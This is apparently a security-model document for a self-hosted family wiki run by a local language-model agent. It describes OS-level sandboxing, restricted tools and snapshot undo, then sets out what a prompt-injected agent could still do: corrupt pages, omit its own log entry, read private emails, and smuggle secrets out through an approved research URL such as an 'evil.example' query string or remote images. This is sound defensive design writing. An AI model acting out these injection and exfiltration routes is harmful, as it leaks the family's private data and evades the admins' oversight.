# Security model

The model reads text written by strangers: web pages, emails, PDFs, other people's
messages. This design doesn't try to make the model resist prompt injection. It
makes a successful injection boring.

## Who can do what

| User | Runs | Network | Writes |
|---|---|---|---|
| `wikibot` | wiki-runner, pi | the llama.cpp servers only | `wiki/`, `lists/`, `_review/` |
| `llm` | llama-server | loopback only | its cache |
| `wikiglue` | wikiglue | localhost only: Synapse, Karakeep, the model server | `raw/`, `lists/`, `_review/`, the jobs queue |
| `wikimail` | mbsync (optional) | DNS and IMAPS only | its Maildirs |
| Docker | Synapse, Karakeep | Synapse: a push gateway; Karakeep's crawler: the web | their volumes |

The limits come from the operating system, not from prompts:

- `examples/nftables/wikiguard.nft`: per-user output rules (`meta skuid`), with drops logged as `wikiguard-drop`.
- `examples/systemd/*.service`: `IPAddressDeny=any` plus allow-lists, `ProtectSystem=strict`,
  `ProtectHome=tmpfs` with only the vault bound in, and no new privileges.
- `examples/lockdown/vault-acl.sh`: POSIX ACLs that make `raw/`, `_tasks/`, `_config/` and
  `AGENTS.md` read-only to `wikibot`.

## What the agent can and can't do

- **Tools:** pi runs with `read`, `edit`, `write`, `grep`, `find` and `ls` only, and
  `run-task.sh` drops anything else a task file asks for. There is no shell, no MCP
  and no web tool, and pi runs offline (`PI_OFFLINE=1`).
- **No overwrites:** `write` can create files but not replace them
  (`runner/no-overwrite.ts`), so a confused or hostile run can't blank a page in one call.
- **No deletes:** there is no delete tool. Retired pages become `type: redirect`.
- **Jobs can't name commands:** the runner accepts a task name matching `[a-z0-9_-]+`
  that exists in `_tasks/`, and nothing else.

## Paths from the model to the outside world

| Path | Guard |
|---|---|
| Chat replies | wikiglue posts the job's reply to the room it came from. The model can't choose a room or a recipient. |
| Research requests | The model can append a suggestion to `_review/research-requests.md`. Nothing is fetched until an admin ticks it in Obsidian or sends `approve N`. |
| Chat routing | Covered in the README: JSON-schema output, re-checked, run with the sender's own permissions. |
| The website (if you serve the wiki with Quartz) | Built from `wiki/`, `lists/` and `raw/` sources by a user with no network, and loads nothing from third parties. |

## Undo

`examples/history/snapshot.sh` commits the vault to a git repository outside the
vault every 15 minutes, so any bad edit can be found and reverted.

## What this doesn't protect against

The sandbox decides what a hijacked run can *reach*. Within that reach, a prompt
injection can still do real damage, and some parts of the system are trusted.

**What an injected source can still do**

- **Corrupt the wiki.** The agent can write anywhere in `wiki/`, `lists/` and
  `_review/`: false facts with real-looking citations, a changed gift card balance,
  an item added to the shopping list, a page emptied one `edit` at a time. Nothing
  stops this; snapshots undo it, if someone notices. `wiki/log.md` lists every job's
  changes, but a hijacked job can leave its own entry out, so the snapshot history is
  the record to trust.
- **Read everything in the vault.** Every job can read every page and every source,
  including other people's emails and `_config/family_data.md`. There is no
  per-person privacy: anyone who can use the chat bot or the site can ask about
  anything in the vault.
- **Try to carry data out.** The agent can't reach the internet, but it can write
  text that something else later fetches:
  - *Research requests.* A suggested `source:` URL is fetched by Karakeep when an
    admin approves it, so the URL itself could carry data (`https://evil.example/?q=<secret>`).
    Read the whole URL before approving.
  - *Images.* A remote image written into a page is fetched by whoever views it.
    The nightly lint flags remote images in `wiki/` and turns them into plain links;
    until it runs, Obsidian fetches them. A site build should turn them into links on
    every page, as the README describes.
  - *Chat replies.* A reply goes back only to the room the question came from, so it
    can't reach a stranger, but it can mislead the person who asked.
- **Waste time.** A run can loop until its time limit (`time-limit-minutes:`, 30
  by default), holding up the queue.

**What is trusted**

- **wikiglue.** It runs outside the agent's sandbox and parses untrusted input itself:
  Matrix events, emails (including HTML), Karakeep bookmarks. A bug there is
  contained only by its own systemd unit (localhost only; in the vault it writes only
  `raw/`, `lists/` and `_review/`), not by the agent's rules.
- **llama.cpp and pi.** The model server decodes untrusted images, and pi with its npm
  dependencies runs on every job. Both are boxed in (`llm` reaches only loopback,
  `wikibot` only the model server), but a memory-safety bug or a malicious package
  update could do anything those users can. Install `pi-runtime` as an ordinary user
  (`npm ci` runs package scripts), review lockfile changes, and keep llama.cpp current.
- **Family members and their devices.** A message from a listed Matrix account is
  that person. Someone who controls a family member's phone, or an admin's, can do
  everything that person can, including approving research requests.
- **Email senders' domains.** An email counts only if it comes from an address a
  family member listed, and only on the sending domain's SPF/DKIM/DMARC result.
  A domain with weak or no DMARC is as good as unauthenticated.
- **The network around it.** Nothing here authenticates people on its own: the site
  has no login, and Synapse and Karakeep have their own accounts. Keeping them off
  the open internet (a tailnet, a VPN, a LAN) is up to you.

**Plain mistakes**

- A model that writes plausible but wrong facts, with no injection at all. Read what
  it writes; `lint` flags contradictions and stale claims, but it's the same model.
- Karakeep's crawler fetching a malicious page. It runs in its own container, with
  no access to the vault or the model.
